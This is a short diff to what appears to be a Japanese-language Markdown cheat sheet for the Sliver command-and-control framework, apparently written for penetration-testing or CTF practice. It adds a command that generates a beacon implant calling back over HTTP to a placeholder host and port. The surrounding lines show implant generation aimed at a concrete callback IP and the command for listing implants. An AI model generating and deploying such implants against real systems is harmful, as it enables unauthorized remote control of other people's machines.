@@ -12,6 +12,9 @@ generate --http 10.10.16.3:4566 --os linux --skip-symbols
 # DNS
 ```
 - Becon
+```
+generate --beacon --http <LHOST>:<LPORT> --os <OS> --arch <ARCH>
+```
 ## ## Implantの設定を確認
 ```sh
 sliver > implants 
